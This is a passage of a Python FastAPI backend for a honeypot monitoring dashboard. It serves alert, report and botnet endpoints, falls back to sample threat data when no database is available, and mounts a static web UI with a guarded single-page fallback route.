                    "tarpitSeconds": dur if (sess.honeypot_service or "").lower() == "labyrinth" else 0,
                })
            return out
        except Exception:
            return sample[:limit]


# ─── Routes: alerts ───────────────────────────────────────────────────────
def _alert_to_dict(a) -> dict:
    return {
        "id": int(a.id),
        "title": a.rule_name or "Alert",
        "description": a.summary,
        "severity": _norm_sev(a.severity),
        "createdAt": _iso(a.triggered_at) or dt.datetime.utcnow().isoformat() + "Z",
        "acknowledged": bool(a.acknowledged),
        "acknowledgedAt": _iso(a.acknowledged_at),
        "sourceIp": None,
        "service": None,
    }


@app.get("/api/alerts")
def list_alerts(acknowledged: Optional[bool] = None):
    sample = [{
        "id": i + 1, "title": t, "description": d, "severity": sev,
        "createdAt": (dt.datetime.utcnow() - dt.timedelta(minutes=i*23)).isoformat() + "Z",
        "acknowledged": ack, "acknowledgedAt": None,
        "sourceIp": ip, "service": svc,
    } for i, (t, d, sev, ack, ip, svc) in enumerate([
        ("Canary token tripped",     "Attacker `cat`ed /root/.aws/credentials in Labyrinth", "critical", False, "185.220.101.42", "labyrinth"),
        ("Credential brute force",   "287 login attempts from single IP in 10 minutes",      "high",     False, "45.155.205.119", "cowrie"),
        ("Malware download captured","ELF binary downloaded — VirusTotal: 24/72 malicious",  "critical", True,  "89.248.167.131", "cowrie"),
        ("Port-scan signature match","Sequential SYN to 1024 ports from a single source",    "medium",   False, "103.75.190.28",  "conpot"),
        ("New Tor exit observed",    "First-seen Tor exit relay hitting honeypot fleet",     "low",      False, "171.25.193.77",  "cowrie"),
    ])]
    if acknowledged is not None:
        sample = [a for a in sample if a["acknowledged"] == acknowledged]
    with _session() as s:
        if s is None:
            return sample
        try:
            from meli.database.models import Alert
            q = s.query(Alert).order_by(Alert.triggered_at.desc())
            if acknowledged is not None:
                q = q.filter(Alert.acknowledged == acknowledged)
            rows = q.limit(200).all()
            if not rows:
                return sample
            return [_alert_to_dict(a) for a in rows]
        except Exception:
            return sample


@app.patch("/api/alerts/{alert_id}/acknowledge")
def acknowledge_alert(alert_id: int):
    with _session() as s:
        if s is None:
            return {"id": alert_id, "title": "Alert", "description": None,
                    "severity": "info",
                    "createdAt": dt.datetime.utcnow().isoformat() + "Z",
                    "acknowledged": True,
                    "acknowledgedAt": dt.datetime.utcnow().isoformat() + "Z",
                    "sourceIp": None, "service": None}
        try:
            from meli.database.models import Alert
            a = s.query(Alert).filter(Alert.id == alert_id).first()
            if not a:
                raise HTTPException(404, "alert not found")
            a.acknowledged = True
            a.acknowledged_at = dt.datetime.now(dt.timezone.utc)
            s.commit()
            return _alert_to_dict(a)
        except HTTPException:
            raise
        except Exception as exc:
            raise HTTPException(500, f"acknowledge failed: {exc}")


# ─── Routes: reports & botnets ────────────────────────────────────────────
@app.get("/api/reports")
def list_reports():
    sample = [{
        "id": i + 1, "title": t, "type": tp, "summary": sm,
        "createdAt": (dt.datetime.utcnow() - dt.timedelta(days=i)).isoformat() + "Z",
        "eventCount": ec, "attackerCount": ac,
    } for i, (t, tp, sm, ec, ac) in enumerate([
        ("Daily threat summary 2026-05-23", "daily",  "47 critical, 124 high — Tor traffic up 22%", 2762, 384),
        ("Weekly retrospective",            "weekly", "Mirai-variant-A campaign accelerating",      18421, 1247),
        ("Botnet campaign profile #7",      "custom", "Gafgyt cluster targeting SSH on 16 IPs",      412, 16),
        ("Monthly intelligence digest",     "monthly","Largest month YTD; 3 new IOC families",      82147, 4128),
    ])]
    with _session() as s:
        if s is None:
            return sample
        try:
            from meli.database.models import Report
            rows = s.query(Report).order_by(Report.generated_at.desc()).all()
            if not rows:
                return sample
            return [{
                "id": int(r.id),
                "title": (r.summary or f"{r.report_type or 'report'} {r.id}").split("\n", 1)[0][:120],
                "type": r.report_type or "custom",
                "summary": r.summary,
                "createdAt": _iso(r.generated_at) or dt.datetime.utcnow().isoformat() + "Z",
                "eventCount": 0, "attackerCount": 0,
            } for r in rows]
        except Exception:
            return sample


@app.get("/api/botnets")
def list_botnets():
    return _SAMPLE_BOTNETS


# ─── Static UI mount (LAST so /api/* routes win) ──────────────────────────
if WEBUI_DIST.exists():
    if (WEBUI_DIST / "assets").exists():
        app.mount(
            "/assets",
            StaticFiles(directory=str(WEBUI_DIST / "assets")),
            name="assets",
        )

    @app.get("/")
    def root_index():
        return FileResponse(str(WEBUI_DIST / "index.html"))

    @app.get("/{path:path}")
    def spa_fallback(path: str):
        if path.startswith("api/"):
            raise HTTPException(404)
        try:
            target = (WEBUI_DIST / path).resolve()
            target.relative_to(WEBUI_DIST)
        except (ValueError, RuntimeError):
            return FileResponse(str(WEBUI_DIST / "index.html"))
        if target.is_file():
            return FileResponse(str(target))
        return FileResponse(str(WEBUI_DIST / "index.html"))
else:
    @app.get("/")
    def missing_dist():
        return JSONResponse(
            status_code=503,
            content={
                "error": "webui not built",
                "hint": f"expected {WEBUI_DIST} — run install.sh or `cd webui && npm install && npm run build`",
            },
        )


def get_app() -> FastAPI:
    return app


__all__ = ["app", "get_app", "WEBUI_DIST"]
